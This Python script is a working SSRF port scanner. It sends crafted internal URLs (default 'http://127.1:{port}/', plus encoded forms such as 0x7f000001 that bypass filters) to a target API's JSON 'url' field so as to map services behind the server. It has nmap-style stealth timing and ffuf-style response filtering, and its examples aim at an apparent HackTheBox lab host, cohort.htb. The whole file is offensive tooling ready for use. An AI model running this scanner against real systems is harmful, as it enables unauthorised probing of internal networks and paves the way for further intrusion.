#!/usr/bin/env python3
"""
ssrf_portscan.py - Advanced API-based SSRF Port Scanner
Inspired by ffuf + nmap timing & filtering.

Usage examples:
  python ssrf_portscan.py -u https://cohort.htb/api/validate -F
  python ssrf_portscan.py -u https://cohort.htb/api/validate -F -fc 405 -t 0.5
  python ssrf_portscan.py -u https://cohort.htb/api/validate -p 1-1024 -T4
  python ssrf_portscan.py -u https://cohort.htb/api/validate --endpoint 127.1 -p 80,443,8888,5000
  python ssrf_portscan.py -u https://cohort.htb/api/validate -F --endpoint 0x7f000001
"""

import argparse
import re
import sys
import threading
import time
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ---------------------------------------------------------------------------
# Nmap-inspired Timing Templates (-T0 .. -T5)
# Values adapted from official Nmap documentation for sequential request scanning.
# ---------------------------------------------------------------------------
NMAP_TIMING = {
    0: {"timeout": 300.0, "delay": 300.0, "name": "Paranoid"},   # 5 min
    1: {"timeout": 15.0,  "delay": 15.0,  "name": "Sneaky"},
    2: {"timeout": 10.0,  "delay": 0.4,   "name": "Polite"},
    3: {"timeout": 5.0,   "delay": 0.0,   "name": "Normal"},
    4: {"timeout": 1.25,  "delay": 0.0,   "name": "Aggressive"},
    5: {"timeout": 0.3,   "delay": 0.0,   "name": "Insane"},
}

# Curated high-value ports (most common services) + remaining 1-1000 for -F
# Order prioritises interesting services first, then fills the rest of top-1000 style.
PRIORITY_PORTS = [
    80, 443, 22, 21, 25, 53, 110, 143, 993, 995, 587, 465,
    3306, 5432, 6379, 27017, 11211, 9200, 5601,
    8080, 8443, 8000, 8888, 3000, 5000, 9000, 9090,
    3389, 5900, 5901, 5985, 5986,
    445, 139, 135, 111, 2049,
    1521, 1433, 3307, 5672, 15672, 8161,
    2375, 2376, 6443, 10250, 10255,
    7000, 7001, 9042, 9160,
    4443, 4444, 8081, 8082, 8444, 8880, 9443,
    10000, 10443, 18080, 28080,
]

# Build Top-1000 style list: priority first, then remaining ports 1-1000
_seen = set(PRIORITY_PORTS)
NMAP_TOP_1000_PORTS = PRIORITY_PORTS + [
    p for p in range(1, 1001) if p not in _seen
]


def parse_range_string(val_str: str) -> set:
    """Parse ffuf-style lists and ranges: '200,300-400,500' → set of ints."""
    items = set()
    if not val_str:
        return items
    for part in val_str.split(","):
        part = part.strip()
        if not part:
            continue
        if "-" in part:
            try:
                start, end = map(int, part.split("-", 1))
                items.update(range(min(start, end), max(start, end) + 1))
            except ValueError:
                pass
        else:
            try:
                items.add(int(part))
            except ValueError:
                pass
    return items


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description=(
            "Advanced API-based SSRF Port Scanner (ffuf + nmap inspired).\n"
            "Sends POST requests with JSON payload containing a crafted URL\n"
            "to discover open ports via Server-Side Request Forgery."
        ),
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python ssrf_portscan.py -u https://cohort.htb/api/validate -F\n"
            "  python ssrf_portscan.py -u https://cohort.htb/api/validate -F -fc 405\n"
            "  python ssrf_portscan.py -u https://cohort.htb/api/validate -p 1-1024 -T4\n"
            "  python ssrf_portscan.py -u https://cohort.htb/api/validate "
            "--endpoint 127.1 -p 80,443,5000,8888\n"
            "  python ssrf_portscan.py -u https://cohort.htb/api/validate "
            "--endpoint 0x7f000001 -F -t 0.5\n"
            "\n"
            "Filter notes (ffuf-style):\n"
            "  -fc / -fs / -fl / -fw accept comma-separated values and ranges\n"
            "  Example: -fc 404,500-503   -fs 89,120-150\n"
            "  Results that match any filter are suppressed (OR logic)."
        ),
    )

    # Target
    parser.add_argument(
        "-u", "--url",
        required=True,
        help="Target API endpoint that accepts POST (e.g. https://cohort.htb/api/validate)",
    )
    parser.add_argument(
        "--endpoint",
        default="127.1",
        help=(
            "SSRF target host/IP fragment (default: 127.1).\n"
            "Only the host part – the script builds http://{endpoint}:{port}/\n"
            "Examples: 127.1  |  127.0.0.1  |  0x7f000001  |  2130706433  |  localhost"
        ),
    )

    # Port selection
    parser.add_argument(
        "-p", "--ports",
        type=str,
        default="1-65535",
        help="Port range / list to scan (default: 1-65535). e.g. 1-1024 or 80,443,8888",
    )
    parser.add_argument(
        "-F", "--fast",
        action="store_true",
        help="Fast scan: top ~1000 common ports (priority services first). Works without -T.",
    )

    # Timing
    parser.add_argument(
        "-T",
        type=int,
        choices=[0, 1, 2, 3, 4, 5],
        default=None,
        help=(
            "Nmap timing template (0-5):\n"
            "  0 Paranoid (timeout 300s, delay 300s)\n"
            "  1 Sneaky   (timeout 15s,  delay 15s)\n"
            "  2 Polite   (timeout 10s,  delay 0.4s)\n"
            "  3 Normal   (timeout 5s,   delay 0)   ← default if omitted\n"
            "  4 Aggressive (timeout 1.25s)\n"
            "  5 Insane   (timeout 0.3s)"
        ),
    )
    parser.add_argument(
        "-t", "--timeout",
        type=float,
        default=None,
        help="Override request timeout in seconds (overrides -T timeout)",
    )

    # Filters (ffuf style)
    parser.add_argument(
        "-fc",
        type=str,
        default="",
        help="Filter HTTP status codes (e.g. 404,500-503)",
    )
    parser.add_argument(
        "-fs",
        type=str,
        default="",
        help="Filter response sizes in bytes (e.g. 89,120-150)",
    )
    parser.add_argument(
        "-fl",
        type=str,
        default="",
        help="Filter by number of lines in response",
    )
    parser.add_argument(
        "-fw",
        type=str,
        default="",
        help="Filter by number of words in response",
    )
    parser.add_argument(
        "-fr",
        type=str,
        default="",
        help="Filter responses matching this regular expression (suppress match)",
    )
    parser.add_argument(
        "-mc",
        type=str,
        default="",
        help="Match (show) only these HTTP status codes (opposite of -fc)",
    )
    parser.add_argument(
        "-ms",
        type=str,
        default="",
        help="Match (show) only these response sizes",
    )

    # Output / behaviour
    parser.add_argument(
        "--scheme",
        default="http",
        choices=["http", "https"],
        help="URL scheme used inside the SSRF payload (default: http)",
    )
    parser.add_argument(
        "--path",
        default="/",
        help="Path appended after the port (default: /)",
    )
    parser.add_argument(
        "--format",
        default="csv",
        help="Value for the 'format' field in the JSON body (default: csv)",
    )
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Show filtered-out responses as well (debug)",
    )
    parser.add_argument(
        "--no-color",
        action="store_true",
        help="Disable ANSI colours",
    )

    return parser


def main() -> None:
    parser = build_parser()
    args = parser.parse_args()

    # Colour helpers
    use_color = not args.no_color and sys.stdout.isatty()
    C_RESET = "\033[0m" if use_color else ""
    C_GREEN = "\033[32m" if use_color else ""
    C_YELLOW = "\033[33m" if use_color else ""
    C_RED = "\033[31m" if use_color else ""
    C_CYAN = "\033[36m" if use_color else ""
    C_DIM = "\033[2m" if use_color else ""

    # Filters
    filter_codes = parse_range_string(args.fc)
    filter_sizes = parse_range_string(args.fs)
    filter_lines = parse_range_string(args.fl)
    filter_words = parse_range_string(args.fw)
    match_codes = parse_range_string(args.mc)
    match_sizes = parse_range_string(args.ms)
    filter_regex = re.compile(args.fr, re.IGNORECASE) if args.fr else None

    # Timing
    chosen_template_id = args.T if args.T is not None else 3
    template = NMAP_TIMING[chosen_template_id]
    timeout_val = args.timeout if args.timeout is not None else template["timeout"]
    scan_delay = template["delay"]

    # Ports
    if args.fast:
        ports_to_scan = list(NMAP_TOP_1000_PORTS)
        port_mode_desc = "Top ~1000 Common Ports (-F Fast Scan)"
    else:
        ports_to_scan = sorted(parse_range_string(args.ports))
        port_mode_desc = f"Custom Ports {args.ports}"

    if not ports_to_scan:
        print(f"{C_RED}[-] Error: No valid ports specified.{C_RESET}")
        sys.exit(1)

    total_ports = len(ports_to_scan)
    api_url = args.url.rstrip("/")
    endpoint = args.endpoint.strip()
    scheme = args.scheme
    path = args.path if args.path.startswith("/") else "/" + args.path
    headers = {"Content-Type": "application/json"}

    # Progress tracking
    current_port_idx = 0
    lock = threading.Lock()
    scanning_done = False
    interesting_count = 0

    def monitor_progress() -> None:
        nonlocal current_port_idx, scanning_done
        while not scanning_done:
            try:
                input()
            except (EOFError, KeyboardInterrupt):
                break
            with lock:
                if scanning_done:
                    break
                scanned = current_port_idx
                percent = (scanned / total_ports) * 100 if total_ports else 100
                print(
                    f"\n{C_CYAN}[*] Status: {percent:.2f}% done "
                    f"({scanned}/{total_ports} ports scanned) "
                    f"| Interesting: {interesting_count}{C_RESET}",
                    flush=True,
                )

    monitor_thread = threading.Thread(target=monitor_progress, daemon=True)
    monitor_thread.start()

    # Banner
    print(f"\n{C_CYAN}[*] Target Endpoint : {api_url}{C_RESET}")
    print(f"{C_CYAN}[*] SSRF Target     : {scheme}://{endpoint}:{{port}}{path}{C_RESET}")
    print(
        f"{C_CYAN}[*] Timing          : -T{chosen_template_id} ({template['name']}) "
        f"| Timeout: {timeout_val}s | Delay: {scan_delay}s{C_RESET}"
    )
    print(f"{C_CYAN}[*] Mode            : {port_mode_desc} ({total_ports} targets){C_RESET}")
    if filter_codes or filter_sizes or filter_lines or filter_words or filter_regex or match_codes or match_sizes:
        print(f"{C_CYAN}[*] Filters active  : yes{C_RESET}")
    print(f"{C_CYAN}[*] Press [Enter] for progress, [Ctrl+C] to exit.{C_RESET}\n")

    # Header
    print(
        f"{'PORT':<8} | {'STATUS':<6} | {'SIZE':<7} | {'WORDS':<6} | "
        f"{'LINES':<6} | RESPONSE PREVIEW"
    )
    print("-" * 90)

    start_time = time.time()

    try:
        for idx, port in enumerate(ports_to_scan):
            with lock:
                current_port_idx = idx + 1

            target_url = f"{scheme}://{endpoint}:{port}{path}"
            payload = {"url": target_url, "format": args.format}

            try:
                resp = requests.post(
                    api_url,
                    json=payload,
                    headers=headers,
                    verify=False,
                    timeout=timeout_val,
                )

                status = resp.status_code
                body = resp.text
                size = len(resp.content)
                lines = len(body.splitlines()) if body else 0
                words = len(body.split()) if body else 0

                # Match filters (whitelist)
                if match_codes and status not in match_codes:
                    if args.verbose:
                        print(f"{C_DIM}{port:<8} | {status:<6} | filtered (-mc){C_RESET}", flush=True)
                    continue
                if match_sizes and size not in match_sizes:
                    if args.verbose:
                        print(f"{C_DIM}{port:<8} | {status:<6} | filtered (-ms){C_RESET}", flush=True)
                    continue

                # Exclude filters (blacklist)
                if status in filter_codes:
                    if args.verbose:
                        print(f"{C_DIM}{port:<8} | {status:<6} | filtered (-fc){C_RESET}", flush=True)
                    continue
                if size in filter_sizes:
                    if args.verbose:
                        print(f"{C_DIM}{port:<8} | {status:<6} | filtered (-fs){C_RESET}", flush=True)
                    continue
                if lines in filter_lines:
                    if args.verbose:
                        print(f"{C_DIM}{port:<8} | {status:<6} | filtered (-fl){C_RESET}", flush=True)
                    continue
                if words in filter_words:
                    if args.verbose:
                        print(f"{C_DIM}{port:<8} | {status:<6} | filtered (-fw){C_RESET}", flush=True)
                    continue
                if filter_regex and filter_regex.search(body):
                    if args.verbose:
                        print(f"{C_DIM}{port:<8} | {status:<6} | filtered (-fr){C_RESET}", flush=True)
                    continue

                # Interesting hit
                with lock:
                    interesting_count += 1

                preview = body.replace("\n", " ").replace("\r", " ")[:55]
                # Colour interesting results (especially non-405 / larger bodies)
                color = C_GREEN if status not in (405, 404) or size > 60 else C_YELLOW
                print(
                    f"{color}{port:<8} | {status:<6} | {size:<7} | {words:<6} | "
                    f"{lines:<6} | {preview}{C_RESET}",
                    flush=True,
                )

            except requests.exceptions.Timeout:
                if args.verbose:
                    print(f"{C_DIM}{port:<8} | TIMEOUT{C_RESET}", flush=True)
            except requests.exceptions.RequestException as e:
                if args.verbose:
                    print(f"{C_DIM}{port:<8} | ERROR: {e.__class__.__name__}{C_RESET}", flush=True)

            if scan_delay > 0:
                time.sleep(scan_delay)

    except KeyboardInterrupt:
        print(f"\n\n{C_YELLOW}[!] Scan interrupted by user (Ctrl+C). Exiting gracefully...{C_RESET}")

    finally:
        with lock:
            scanning_done = True
        elapsed = time.time() - start_time
        print(
            f"\n{C_GREEN}[+] Scan finished in {elapsed:.2f}s "
            f"| {interesting_count} interesting responses shown "
            f"| {current_port_idx}/{total_ports} ports probed{C_RESET}",
            flush=True,
        )
        sys.exit(0)


if __name__ == "__main__":
    main()
